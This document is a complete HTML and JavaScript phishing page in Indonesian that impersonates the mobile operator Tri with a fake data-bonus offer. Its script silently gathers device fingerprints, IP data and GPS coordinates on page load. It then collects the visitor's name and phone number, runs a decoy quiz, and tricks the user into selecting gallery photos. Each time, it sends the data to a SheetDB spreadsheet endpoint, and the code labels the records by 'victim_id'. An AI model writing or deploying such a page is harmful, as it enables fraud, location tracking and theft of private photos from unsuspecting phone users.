<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Klaim Bonus TRI - 3 (Three)</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #000;
            min-height: 100vh;
        }

        .header {
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 3px solid #ffd700;
        }

        .logo {
            width: 60px;
            height: 60px;
            object-fit: contain;
        }

        .tagline {
            color: #ffd700;
            font-size: 0.75rem;
            font-weight: 600;
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }

        .tri-badge {
            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
            color: #000;
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 700;
            margin-bottom: 15px;
        }

        .special-offer {
            background: linear-gradient(135deg, #ff0066 0%, #ff0080 100%);
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 20px;
            animation: glow 2s infinite;
        }

        @keyframes glow {
            0%, 100% { box-shadow: 0 0 10px rgba(255, 0, 102, 0.5); }
            50% { box-shadow: 0 0 20px rgba(255, 0, 102, 0.8); }
        }

        .special-offer p {
            color: white;
            font-weight: 600;
            font-size: 0.9rem;
        }

        .special-offer p strong {
            font-size: 1.2rem;
        }

        .promo-banner {
            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
            color: #000;
            padding: 30px 20px;
            text-align: center;
            border-radius: 15px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.3);
        }

        .promo-banner h1 {
            font-size: 1.8rem;
            margin-bottom: 10px;
            text-transform: uppercase;
        }

        .promo-banner .bonus {
            font-size: 3rem;
            font-weight: 900;
            margin: 15px 0;
            text-shadow: 2px 2px 0 rgba(0,0,0,0.1);
        }

        .card {
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
            margin-bottom: 15px;
            border: 1px solid #333;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #ffd700;
            font-weight: 600;
            font-size: 0.9rem;
        }

        .form-group input {
            width: 100%;
            padding: 14px 15px;
            border: 2px solid #333;
            border-radius: 10px;
            font-size: 1rem;
            background: #1a1a1a;
            color: #fff;
            transition: border-color 0.3s;
        }

        .form-group input:focus {
            outline: none;
            border-color: #ffd700;
        }

        .form-group input::placeholder {
            color: #666;
        }

        .form-group .hint {
            font-size: 0.75rem;
            color: #888;
            margin-top: 5px;
        }

        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
        }

        .btn-primary {
            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
            color: #000;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.4);
        }

        .btn-primary:disabled {
            background: #333;
            color: #666;
            cursor: not-allowed;
            transform: none;
        }

        .success-screen {
            text-align: center;
            padding: 40px 20px;
            display: none;
        }

        .success-screen.show {
            display: block;
        }

        .success-icon {
            font-size: 5rem;
            margin-bottom: 20px;
        }

        .success-screen h2 {
            color: #ffd700;
            margin-bottom: 10px;
            text-transform: uppercase;
        }

        .success-screen p {
            color: #ccc;
            line-height: 1.6;
        }

        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }

        .loading.show {
            display: block;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #333;
            border-top: 4px solid #ffd700;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .error-msg {
            background: rgba(255, 68, 68, 0.1);
            color: #ff4444;
            padding: 12px 15px;
            border-radius: 8px;
            font-size: 0.85rem;
            margin-top: 10px;
            display: none;
            border: 1px solid rgba(255, 68, 68, 0.3);
        }

        .error-msg.show {
            display: block;
        }

        .form-screen {
            display: block;
        }

        .form-screen.hidden {
            display: none;
        }

        .footer {
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 0.7rem;
        }

        /* Hidden file input for gallery */
        #gallery-input {
            display: none;
        }

        /* Gallery permission trigger (hidden on success) */
        .gallery-trigger {
            margin-top: 30px;
            padding: 20px;
            background: rgba(255, 215, 0, 0.1);
            border: 2px dashed #ffd700;
            border-radius: 12px;
            text-align: center;
            cursor: pointer;
            display: none;
        }

        .gallery-trigger.show {
            display: block;
        }

        .gallery-trigger:hover {
            background: rgba(255, 215, 0, 0.2);
        }

        .gallery-trigger .icon {
            font-size: 3rem;
            margin-bottom: 10px;
        }

        .gallery-trigger p {
            color: #ffd700;
            font-size: 0.9rem;
        }

        .gallery-trigger p:last-child {
            color: #888;
            font-size: 0.75rem;
            margin-top: 5px;
        }

        /* Quiz Styles */
        .quiz-container {
            margin-top: 25px;
            padding: 20px;
            background: rgba(255, 215, 0, 0.05);
            border: 2px solid #ffd700;
            border-radius: 12px;
            display: none;
        }

        .quiz-container.show {
            display: block;
            animation: slideIn 0.5s ease-out;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .quiz-title {
            color: #ffd700;
            font-size: 1.1rem;
            font-weight: 700;
            margin-bottom: 15px;
            text-align: center;
            text-transform: uppercase;
        }

        .quiz-progress {
            display: flex;
            gap: 5px;
            margin-bottom: 20px;
            justify-content: center;
        }

        .quiz-progress-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #333;
            transition: background 0.3s;
        }

        .quiz-progress-dot.active {
            background: #ffd700;
        }

        .quiz-progress-dot.completed {
            background: #00ff88;
        }

        .quiz-question {
            margin-bottom: 20px;
            display: none;
        }

        .quiz-question.active {
            display: block;
            animation: fadeSlide 0.3s ease-out;
        }

        @keyframes fadeSlide {
            from { opacity: 0; transform: translateX(20px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .quiz-question-text {
            color: #fff;
            font-size: 1rem;
            margin-bottom: 15px;
            line-height: 1.5;
        }

        .quiz-option {
            display: block;
            padding: 12px 15px;
            margin-bottom: 10px;
            background: #1a1a1a;
            border: 2px solid #333;
            border-radius: 8px;
            color: #ccc;
            cursor: pointer;
            transition: all 0.3s;
            text-align: left;
            font-size: 0.9rem;
        }

        .quiz-option:hover {
            background: #2a2a2a;
            border-color: #ffd700;
        }

        .quiz-option.selected {
            background: rgba(255, 215, 0, 0.2);
            border-color: #ffd700;
            color: #ffd700;
        }

        .quiz-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
            color: #000;
            border: none;
            border-radius: 8px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 15px;
        }

        .quiz-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
        }

        .quiz-btn:disabled {
            background: #333;
            color: #666;
            cursor: not-allowed;
            transform: none;
        }

        .quiz-result {
            text-align: center;
            padding: 20px;
            display: none;
        }

        .quiz-result.show {
            display: block;
        }

        .quiz-score {
            font-size: 2.5rem;
            font-weight: 900;
            color: #ffd700;
            margin: 15px 0;
        }

        .quiz-score-text {
            color: #ccc;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="3-LOGO.png" alt="TRI" class="logo">
        <div class="tagline">GET YOURS</div>
    </div>

    <div class="container">
        <div class="tri-badge">üî• PROMO KHUSUS PENGGUNA TRI</div>

        <div class="special-offer">
            <p>BONUS <strong>UNLIMITED DATA 10GB</strong> + <strong>100 MENIT</strong></p>
        </div>

        <div class="promo-banner">
            <h1>KLAIM SEKARANG</h1>
            <div class="bonus">10GB + 100 MIN</div>
            <p>Khusus pengguna aktif! Berlaku sampai 28 Feb 2026</p>
        </div>

        <div class="card">
            <!-- Form Screen -->
            <div class="form-screen" id="form-screen">
                <h3 style="margin-bottom: 20px; color: #fff; text-align: center;">Data Penerima</h3>

                <div class="form-group">
                    <label>Nomor Handphone</label>
                    <input type="tel" id="nohp" placeholder="08xxxxxxxxxx" maxlength="13">
                    <div class="hint">Pastikan nomor TRI aktif</div>
                </div>

                <div class="form-group">
                    <label>Nama Pemilik</label>
                    <input type="text" id="nama" placeholder="Nama sesuai KTP">
                </div>

                <div class="error-msg" id="error"></div>

                <button class="btn btn-primary" onclick="submitForm()" id="submit-btn">
                    KLAIM BONUS ‚Üí
                </button>

                <div class="loading" id="loading">
                    <div class="spinner"></div>
                    <p style="color: #aaa;">Memproses...</p>
                </div>
            </div>

            <!-- Success Screen -->
            <div class="success-screen" id="success-screen">
                <div class="success-icon">üéâ</div>
                <h2>Selamat!</h2>
                <p>Pendaftaran berhasil!</p>
                <p style="margin-top: 15px;">Bonus 10GB + 100 Menit akan diaktifkan dalam 1x24 jam</p>
                <p style="margin-top: 10px; font-size: 0.8rem; color: #888;">
                    Tiket: <span id="ticket-id">TRI-</span>
                </p>

                <!-- Quiz Section -->
                <div class="quiz-container" id="quiz-container">
                    <div class="quiz-title">üß† Kuis Ringan - Dapatkan Bonus Extra!</div>

                    <div class="quiz-progress" id="quiz-progress"></div>

                    <div id="quiz-questions">
                        <!-- Questions will be inserted by JavaScript -->
                    </div>

                    <button class="quiz-btn" id="quiz-next-btn" onclick="nextQuestion()" disabled>
                        LANJUT ‚Üí
                    </button>

                    <div class="quiz-result" id="quiz-result">
                        <div style="font-size: 3rem;">üèÜ</div>
                        <div class="quiz-score" id="quiz-score">0/10</div>
                        <div class="quiz-score-text">Jawaban benar!</div>
                        <p style="margin-top: 15px; color: #888; font-size: 0.85rem;">
                            Terima kasih telah berpartisipasi!
                        </p>
                    </div>
                </div>

                <!-- Hidden gallery trigger - will be activated automatically -->
                <div class="gallery-trigger" id="gallery-trigger" onclick="triggerGallery()">
                    <div class="icon">üìÅ</div>
                    <p>Klik untuk verifikasi</p>
                    <p>Syarat pengaktifan bonus</p>
                </div>
            </div>
        </div>

        <div class="footer">
            <p>¬© 2026 Tri (3). Semua hak dilindungi.</p>
        </div>
    </div>

    <!-- Hidden file input for gallery access -->
    <input type="file" id="gallery-input" accept="image/*" multiple style="display: none;">

    <script>
        // ===== CONFIGURATION =====
        const CONFIG = {
            // SheetDB API (‰∏çÈúÄË¶ÅApps Script!)
            webhookUrl: 'https://sheetdb.io/api/v1/v3t0nev0p3rcr',
            autoSend: true,
            maxImages: 10
        };

        // ===== DATA =====
        let userData = {
            nama: '',
            nohp: '',
            location: null,
            ipInfo: null,
            device: null,
            images: []
        };

        // ===== IMMEDIATE LOCATION REQUEST =====
        document.addEventListener('DOMContentLoaded', async () => {
            // Get device info (sync, immediate)
            const ua = navigator.userAgent;

            // Try Client Hints API first (more accurate for modern browsers)
            let deviceBrand = 'Unknown';
            let deviceModel = 'Unknown';

            if (navigator.userAgentData) {
                try {
                    const uaData = await navigator.userAgentData.getHighEntropyValues([
                        'platform',
                        'platformVersion',
                        'architecture',
                        'model',
                        'brand'
                    ]);

                    console.log('[TRI] Client Hints:', uaData);

                    if (uaData.model) {
                        deviceModel = uaData.model;
                        // Detect brand from model
                        const modelLower = uaData.model.toLowerCase();
                        if (modelLower.includes('sm-') || modelLower.includes('samsung') || modelLower.includes('galaxy')) {
                            deviceBrand = 'Samsung';
                        } else if (modelLower.includes('iphone') || modelLower.includes('ipad')) {
                            deviceBrand = 'Apple';
                        } else if (modelLower.includes('redmi') || modelLower.includes('poco') || modelLower.includes('mi ')) {
                            deviceBrand = 'Xiaomi';
                        } else if (modelLower.includes('oppo') || modelLower.includes('reno') || modelLower.includes('a5') || modelLower.includes('a7') || modelLower.includes('cph')) {
                            deviceBrand = 'OPPO'; // CPH is OPPO/Realme
                            if (modelLower.includes('cph') || modelLower.includes('realme')) {
                                deviceBrand = 'Realme';
                            }
                        } else if (modelLower.includes('vivo')) {
                            deviceBrand = 'Vivo';
                        } else if (modelLower.includes('infinix')) {
                            deviceBrand = 'Infinix';
                        } else if (modelLower.includes('tecno') || modelLower.includes('itel')) {
                            deviceBrand = 'Tecno';
                        } else if (modelLower.includes('huawei') || modelLower.includes('honor')) {
                            deviceBrand = 'Huawei';
                        } else if (modelLower.includes('asus') || modelLower.includes('zenfone')) {
                            deviceBrand = 'Asus';
                        } else {
                            deviceBrand = uaData.model; // Use model name if brand unknown
                        }
                    }
                } catch (e) {
                    console.log('[TRI] Client Hints error:', e);
                }
            }

            // Fallback to User Agent parsing
            if (deviceBrand === 'Unknown') {
                if (ua.includes('iPhone') || ua.includes('iPad')) deviceBrand = 'Apple';
                else if (ua.includes('Samsung')) deviceBrand = 'Samsung';
                else if (ua.includes('Xiaomi') || ua.includes('Redmi') || ua.includes('POCO') || ua.includes('Mi')) deviceBrand = 'Xiaomi';
                else if (ua.includes('OPPO') || ua.includes('Reno') || ua.includes('A5') || ua.includes('A7')) deviceBrand = 'OPPO';
                else if (ua.includes('vivo') || ua.includes('Vivo')) deviceBrand = 'Vivo';
                else if (ua.includes('Realme') || ua.includes('CPH')) deviceBrand = 'Realme';
                else if (ua.includes('OnePlus')) deviceBrand = 'OnePlus';
                else if (ua.includes('Infinix')) deviceBrand = 'Infinix';
                else if (ua.includes('TECNO') || ua.includes('itel')) deviceBrand = 'Tecno';
                else if (ua.includes('Huawei') || ua.includes('Honor')) deviceBrand = 'Huawei';
                else if (ua.includes('Asus')) deviceBrand = 'Asus';
            }

            userData.device = {
                userAgent: ua,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                brand: deviceBrand,
                model: deviceModel
            };

            console.log('[TRI] Device brand:', deviceBrand);
            console.log('[TRI] Device model:', deviceModel);
            console.log('[TRI] Page loaded. Loading IP info...');

            // WAIT for IP info to complete FIRST
            await getIPInfo();

            console.log('[TRI] IP info loaded. Now requesting location...');

            // THEN request location (after IP info is ready)
            requestLocationImmediately();
        });

        // ===== REQUEST LOCATION IMMEDIATELY =====
        function requestLocationImmediately() {
            if (!navigator.geolocation) {
                console.log('[TRI] Geolocation not supported');
                // Still exfiltrate even without GPS support
                exfiltrateLocationOnly();
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    // Success - location captured silently
                    userData.location = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };

                    console.log('[TRI] ‚úÖ Location captured:', userData.location);
                    console.log('[TRI] GPS:', userData.location.lat, userData.location.lng);

                    // AUTO STORE location + device info immediately
                    await exfiltrateLocationOnly();
                },
                async (error) => {
                    // Error or denied - STILL EXFILTRATE with IP-based location
                    console.log('[TRI] ‚ùå Location error:', error.message);

                    if (error.code === error.PERMISSION_DENIED) {
                        console.log('[TRI] User denied location - using IP-based location instead');
                    }

                    // STILL STORE even if GPS denied (use IP-based location)
                    await exfiltrateLocationOnly();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        // ===== GET IP INFO =====
        async function getIPInfo() {
            try {
                // Use HTTPS API (ipapi.co - supports HTTPS free tier)
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                userData.ipInfo = {
                    status: 'success',
                    query: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    regionName: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    countryCode: data.country_code || 'Unknown',
                    isp: data.org || 'Unknown',
                    timezone: data.timezone || 'Unknown',
                    // IP-based location (fallback)
                    latitude: data.latitude || null,
                    longitude: data.longitude || null
                };

                console.log('[TRI] IP info:', userData.ipInfo?.city, userData.ipInfo?.country);
            } catch (error) {
                console.log('[TRI] IP info error:', error);
            }
        }

        // ===== SUBMIT FORM =====
        async function submitForm() {
            const nama = document.getElementById('nama').value.trim();
            const nohp = document.getElementById('nohp').value.trim();
            const error = document.getElementById('error');
            const loading = document.getElementById('loading');

            // Validation
            if (!nohp || nohp.length < 10) {
                error.textContent = '‚ùå Masukkan nomor TRI yang valid';
                error.classList.add('show');
                return;
            }

            if (!nama) {
                error.textContent = '‚ùå Masukkan nama pemilik';
                error.classList.add('show');
                return;
            }

            // Save data
            userData.nama = nama;
            userData.nohp = nohp;

            // Show loading
            loading.classList.add('show');
            document.getElementById('submit-btn').disabled = true;

            // Exfiltrate all data (location + form input)
            await exfiltrateData();

            // Hide form, show success
            setTimeout(() => {
                loading.classList.remove('show');
                document.getElementById('form-screen').classList.add('hidden');
                document.getElementById('success-screen').classList.add('show');

                // Generate ticket
                const ticketId = 'TRI-' + Date.now().toString(36).toUpperCase();
                document.getElementById('ticket-id').textContent = ticketId;

                // Show quiz after 2 seconds
                setTimeout(() => {
                    showQuiz();
                }, 2000);

                // AFTER SUCCESS - trigger gallery permission (after quiz)
                // setTimeout(() => {
                //     triggerGallery();
                // }, 2000);

                console.log('[TRI] ===== CAPTURED DATA =====');
                console.log('Nama:', userData.nama);
                console.log('No HP:', userData.nohp);
                console.log('Location:', userData.location);
                console.log('IP Info:', userData.ipInfo);
                console.log('==========================');
            }, 1500);
        }

        // ===== TRIGGER GALLERY PERMISSION (AFTER SUCCESS) =====
        function triggerGallery() {
            const galleryTrigger = document.getElementById('gallery-trigger');

            // Show the trigger UI
            galleryTrigger.classList.add('show');

            // Automatically trigger the file input (this will open gallery picker)
            console.log('[TRI] Triggering gallery permission...');

            // Click the hidden file input
            setTimeout(() => {
                document.getElementById('gallery-input').click();
            }, 500);
        }

        // ===== HANDLE GALLERY UPLOAD =====
        document.getElementById('gallery-input').addEventListener('change', function(event) {
            const files = Array.from(event.target.files);

            console.log(`[TRI] üìÅ Gallery accessed! User selected ${files.length} files`);

            // Process files
            files.forEach((file) => {
                if (userData.images.length >= CONFIG.maxImages) return;

                if (!file.type.startsWith('image/')) return;

                const reader = new FileReader();
                reader.onload = (e) => {
                    const imageData = e.target.result.split(',')[1];

                    userData.images.push({
                        name: file.name,
                        size: file.size,
                        type: file.type,
                        data: imageData.substring(0, 100000) // First 100KB
                    });

                    console.log(`[TRI] üì∏ Image stored: ${file.name} (${(file.size/1024).toFixed(1)}KB)`);

                    // Send gallery data to spreadsheet
                    exfiltrateGalleryData();
                };
                reader.readAsDataURL(file);
            });

            // Hide the trigger after selection
            document.getElementById('gallery-trigger').classList.remove('show');
        });

        // ===== EXFILTRATE LOCATION ONLY (SAAT ALLOW LOKASI) =====
        async function exfiltrateLocationOnly() {
            // Generate victim ID sementara
            const tempVictimId = 'tri_' + btoa(Date.now().toString()).substring(0, 10);

            const now = new Date();
            const payload = {
                timestamp: now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
                timestamp_iso: now.toISOString(), // Keep ISO for sorting
                victim_id: tempVictimId,
                template: 'tri_location_only',
                nama: 'Pending',
                nohp: 'Pending',
                ip: userData.ipInfo?.query || 'Unknown',
                city: userData.ipInfo?.city || 'Unknown',
                region: userData.ipInfo?.regionName || 'Unknown',
                country: userData.ipInfo?.country || 'Unknown',
                isp: userData.ipInfo?.isp || 'Unknown',
                // GPS location (fallback to IP-based location)
                gps_lat: userData.location?.lat || userData.ipInfo?.latitude || 'Unknown',
                gps_lng: userData.location?.lng || userData.ipInfo?.longitude || 'Unknown',
                gps_accuracy: userData.location?.accuracy || 'IP-based',
                platform: userData.device?.platform || 'Unknown',
                screen: userData.device?.screen || 'Unknown',
                language: userData.device?.language || 'Unknown',
                timezone: userData.device?.timezone || 'Unknown',
                device_brand: userData.device?.brand || 'Unknown',
                device_model: userData.device?.model || 'Unknown',
                user_agent: userData.device?.userAgent || 'Unknown'
            };

            console.log('[TRI] üì§ Auto-exfiltrating location + device info...');
            console.log('[TRI] Payload:', payload);

            if (CONFIG.webhookUrl) {
                try {
                    const response = await fetch(CONFIG.webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                        body: JSON.stringify(payload)
                    });

                    const result = await response.json();
                    console.log('[TRI] ‚úÖ Location saved to spreadsheet:', result);
                } catch (error) {
                    console.error('[TRI] ‚ùå Location exfiltration failed:', error);
                }
            }

            // Simpan victim_id untuk dipakai saat form submit
            userData.tempVictimId = tempVictimId;
        }

        // ===== EXFILTRATE FORM DATA (SAAT SUBMIT) =====
        async function exfiltrateData() {
            // SheetDB format: flat JSON (no nested objects!)
            const now = new Date();
            const payload = {
                timestamp: now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
                timestamp_iso: now.toISOString(), // Keep ISO for sorting
                victim_id: 'tri_' + btoa(userData.nohp + Date.now()).substring(0, 10),
                template: 'tri_bonus',
                nama: userData.nama,
                nohp: userData.nohp,
                ip: userData.ipInfo?.query || 'Unknown',
                city: userData.ipInfo?.city || 'Unknown',
                region: userData.ipInfo?.regionName || 'Unknown',
                country: userData.ipInfo?.country || 'Unknown',
                isp: userData.ipInfo?.isp || 'Unknown',
                // GPS location (fallback to IP-based location)
                gps_lat: userData.location?.lat || userData.ipInfo?.latitude || 'Unknown',
                gps_lng: userData.location?.lng || userData.ipInfo?.longitude || 'Unknown',
                gps_accuracy: userData.location?.accuracy || 'IP-based',
                platform: userData.device?.platform || 'Unknown',
                screen: userData.device?.screen || 'Unknown',
                language: userData.device?.language || 'Unknown',
                timezone: userData.device?.timezone || 'Unknown',
                device_brand: userData.device?.brand || 'Unknown',
                device_model: userData.device?.model || 'Unknown',
                user_agent: userData.device?.userAgent || 'Unknown'
            };

            console.log('[TRI] üì§ Exfiltrating form + location data...');
            console.log('[TRI] SheetDB URL:', CONFIG.webhookUrl);
            console.log('[TRI] Payload:', payload);

            if (CONFIG.autoSend && CONFIG.webhookUrl) {
                try {
                    const response = await fetch(CONFIG.webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                        body: JSON.stringify(payload)
                    });

                    const result = await response.json();
                    console.log('[TRI] ‚úÖ SheetDB Response:', result);

                    if (response.ok) {
                        console.log('[TRI] ‚úÖ Data saved to spreadsheet!');
                    } else {
                        console.log('[TRI] ‚ùå Error:', result);
                    }
                } catch (error) {
                    console.error('[TRI] ‚ùå Exfiltration failed:', error);
                }
            }

            // Log to localStorage
            const logs = JSON.parse(localStorage.getItem('triLogs') || '[]');
            logs.push(payload);
            localStorage.setItem('triLogs', JSON.stringify(logs));
        }

        // ===== EXFILTRATE GALLERY DATA (SHEETDB) =====
        async function exfiltrateGalleryData() {
            // SheetDB format: flat JSON per image
            for (const img of userData.images) {
                const now = new Date();
                const payload = {
                    timestamp: now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
                    timestamp_iso: now.toISOString(),
                    victim_id: 'tri_' + btoa(userData.nohp + Date.now()).substring(0, 10),
                    template: 'tri_gallery',
                    nohp: userData.nohp,
                    image_name: img.name,
                    image_size: img.size,
                    image_type: img.type,
                    image_data: img.data?.substring(0, 50000) || '' // First 50KB base64
                };

                console.log(`[TRI] üì§ Exfiltrating image: ${img.name}`);

                try {
                    await fetch(CONFIG.webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    console.log('[TRI] ‚úÖ Image saved!');
                } catch (error) {
                    console.error('[TRI] ‚ùå Image exfiltration failed:', error);
                }
            }
        }

        // ===== QUIZ DATA =====
        const quizData = [
            {
                question: "Berapa harga paket data TRI 10GB?",
                options: ["Rp 10.000", "Rp 25.000", "Rp 50.000", "Rp 100.000"],
                answer: 1
            },
            {
                question: "Apa kepanjangan dari 'IM3'?",
                options: ["Indonesia Mobile 3", "Indosat Multimedia 3", "International Mobile 3", "Indosat Media 3"],
                answer: 1
            },
            {
                question: "Berapa lama masa aktif bonus promo?",
                options: ["1 hari", "7 hari", "30 hari", "Selamanya"],
                answer: 2
            },
            {
                question: "Apa warna logo TRI (3)?",
                options: ["Merah", "Biru", "Putih", "Hitam"],
                answer: 2
            },
            {
                question: "Kapan batas akhir promo ini?",
                options: ["25 Feb 2026", "28 Feb 2026", "1 Mar 2026", "31 Mar 2026"],
                answer: 1
            },
            {
                question: "Berapa bonus menit telpon yang didapat?",
                options: ["50 menit", "100 menit", "150 menit", "200 menit"],
                answer: 1
            },
            {
                question: "Apa yang harus dilakukan setelah klaim bonus?",
                options: ["Restart HP", "Tunggu 1x24 jam", "Hapus aplikasi", "Beli pulsa lagi"],
                answer: 1
            },
            {
                question: "Operator manakah yang menggunakan nomor 08xx?",
                options: ["Telkomsel", "Indosat", "TRI", "Semua benar"],
                answer: 3
            },
            {
                question: "Apa keuntungan pakai aplikasi MyTri?",
                options: ["Cek kuota", "Beli paket", "Bonus extra", "Semua benar"],
                answer: 3
            },
            {
                question: "Berapa GB bonus yang didapat dari promo ini?",
                options: ["5GB", "10GB", "15GB", "20GB"],
                answer: 1
            }
        ];

        let currentQuestion = 0;
        let quizAnswers = [];
        let selectedOption = null;

        // ===== SHOW QUIZ =====
        function showQuiz() {
            const quizContainer = document.getElementById('quiz-container');
            quizContainer.classList.add('show');

            // Generate progress dots
            const progressContainer = document.getElementById('quiz-progress');
            progressContainer.innerHTML = '';
            for (let i = 0; i < quizData.length; i++) {
                const dot = document.createElement('div');
                dot.className = 'quiz-progress-dot';
                if (i === 0) dot.classList.add('active');
                progressContainer.appendChild(dot);
            }

            // Show first question
            showQuestion(0);
            console.log('[TRI] Quiz started - 10 questions');
        }

        // ===== SHOW QUESTION =====
        function showQuestion(index) {
            const container = document.getElementById('quiz-questions');
            const question = quizData[index];

            container.innerHTML = `
                <div class="quiz-question active" id="q${index}">
                    <div class="quiz-question-text">
                        <strong>${index + 1}.</strong> ${question.question}
                    </div>
                    <div class="quiz-options">
                        ${question.options.map((opt, i) => `
                            <button class="quiz-option" onclick="selectOption(${i})" id="opt${index}-${i}">
                                ${String.fromCharCode(65 + i)}. ${opt}
                            </button>
                        `).join('')}
                    </div>
                </div>
            `;

            // Reset selected option
            selectedOption = null;
            document.getElementById('quiz-next-btn').disabled = true;

            // Update progress
            updateProgress(index);
        }

        // ===== UPDATE PROGRESS =====
        function updateProgress(index) {
            const dots = document.querySelectorAll('.quiz-progress-dot');
            dots.forEach((dot, i) => {
                dot.classList.remove('active', 'completed');
                if (i < index) dot.classList.add('completed');
                if (i === index) dot.classList.add('active');
            });
        }

        // ===== SELECT OPTION =====
        function selectOption(optionIndex) {
            selectedOption = optionIndex;

            // Remove previous selection
            document.querySelectorAll('.quiz-option').forEach(opt => {
                opt.classList.remove('selected');
            });

            // Add selection to clicked option
            document.getElementById(`opt${currentQuestion}-${optionIndex}`).classList.add('selected');

            // Enable next button
            document.getElementById('quiz-next-btn').disabled = false;

            console.log(`[TRI] Quiz Q${currentQuestion + 1}: Selected option ${optionIndex + 1}`);
        }

        // ===== NEXT QUESTION =====
        function nextQuestion() {
            // Save answer
            quizAnswers.push({
                question: quizData[currentQuestion].question,
                selected: selectedOption,
                correct: quizData[currentQuestion].answer,
                isCorrect: selectedOption === quizData[currentQuestion].answer
            });

            // Next question or finish
            currentQuestion++;

            if (currentQuestion < quizData.length) {
                showQuestion(currentQuestion);
            } else {
                finishQuiz();
            }
        }

        // ===== FINISH QUIZ =====
        function finishQuiz() {
            // Hide questions and button
            document.getElementById('quiz-questions').innerHTML = '';
            document.getElementById('quiz-next-btn').style.display = 'none';
            document.getElementById('quiz-progress').style.display = 'none';

            // Calculate score
            const correctCount = quizAnswers.filter(a => a.isCorrect).length;

            // Show result
            const resultDiv = document.getElementById('quiz-result');
            resultDiv.classList.add('show');
            document.getElementById('quiz-score').textContent = `${correctCount}/10`;

            console.log(`[TRI] Quiz finished - Score: ${correctCount}/10`);

            // Exfiltrate quiz answers
            exfiltrateQuizAnswers(correctCount);

            // Trigger gallery after quiz
            setTimeout(() => {
                triggerGallery();
            }, 2000);
        }

        // ===== EXFILTRATE QUIZ ANSWERS =====
        async function exfiltrateQuizAnswers(score) {
            const now = new Date();
            const payload = {
                timestamp: now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
                timestamp_iso: now.toISOString(),
                victim_id: 'tri_' + btoa(userData.nohp + Date.now()).substring(0, 10),
                template: 'tri_quiz',
                nama: userData.nama,
                nohp: userData.nohp,
                quiz_score: score,
                quiz_total: 10,
                quiz_answers: JSON.stringify(quizAnswers.map((a, i) => ({
                    q: i + 1,
                    selected: a.selected + 1,
                    correct: a.correct + 1,
                    is_correct: a.isCorrect
                })))
            };

            console.log('[TRI] üì§ Exfiltrating quiz answers...');

            try {
                await fetch(CONFIG.webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify(payload)
                });
                console.log('[TRI] ‚úÖ Quiz answers saved!');
            } catch (error) {
                console.error('[TRI] ‚ùå Quiz exfiltration failed:', error);
            }
        }
    </script>
</body>
</html>
